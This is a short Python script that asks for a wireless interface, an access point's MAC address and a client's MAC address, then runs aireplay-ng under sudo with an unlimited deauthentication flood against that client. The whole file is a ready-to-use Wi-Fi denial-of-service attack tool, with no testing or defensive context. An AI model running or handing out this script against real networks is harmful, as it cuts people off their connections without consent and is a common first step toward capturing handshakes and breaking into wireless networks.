import subprocess

interface = input("Interface: ")
ap = input("MAC-AP: ")
target = input("MAC-TARGET: ")

subprocess.run(["sudo", "aireplay-ng", "--ignore-negative-one", "--deauth", "0", "-a", ap, "-c", target, interface])
